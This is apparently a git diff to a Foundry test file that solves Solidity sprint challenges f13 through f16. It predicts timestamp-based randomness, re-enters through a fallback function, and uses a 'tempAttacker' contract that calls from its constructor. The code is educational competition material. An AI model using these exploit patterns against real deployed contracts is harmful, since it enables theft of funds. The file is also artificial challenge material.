@@ -2,7 +2,7 @@ pragma solidity >= 0.8.5;
 
 import "forge-std/Test.sol";
 import "contracts/ExampleSoliditySprint2022.sol";
-
+import "forge-std/console2.sol";
 
 contract SoliditySprintSolutions is Test {
 
@@ -14,11 +14,11 @@ contract SoliditySprintSolutions is Test {
 
     }
 
-    function setup() public {
-        sprint.registerTeam("dai hard");
+    function setUp() public {
     }
 
     function testSolutions() public {
+
         testf0();
         testf1();
         testf2();
@@ -35,6 +35,18 @@ contract SoliditySprintSolutions is Test {
 
         testf11();
         testf12();
+        testf13();
+
+        uint scoreBefore = sprint.scores(address(this));
+        for(uint x = 0; x < 5; x++) {
+            testf14();
+            skip(5);
+        }
+        uint scoreAfter = sprint.scores(address(this));
+        require(scoreAfter > scoreBefore, "score did not increase keep going");
+
+        testf15();
+        testf16();
     }
 
     function testf0() internal {
@@ -98,4 +110,40 @@ contract SoliditySprintSolutions is Test {
         sprint.f12(c);
     }
 
+    function testf13() internal {
+        sprint.f13();
+    }
+
+    function testf14() internal {
+        uint expectedOutcome = uint(keccak256(abi.encodePacked(block.timestamp)));
+        sprint.f14(expectedOutcome % 2);
+    }
+
+    function testf15() internal {
+        sprint.f15(0);
+    }
+
+    function testf16() internal {
+        new tempAttacker(address(this), address(sprint));
+    }
+
+    fallback() external {
+        sprint.f13();
+    }
+}
+
+contract tempAttacker {
+
+    address public immutable teamAddr;
+    address public immutable currSprint;
+
+    constructor(address _teamAddr, address _currSprint) {
+        teamAddr = _teamAddr;
+        currSprint = _currSprint;
+        ExampleSoliditySprint2022(currSprint).f16(teamAddr);
+    }
+
+    fallback() external {
+        ExampleSoliditySprint2022(currSprint).f16(teamAddr);
+    }
 }
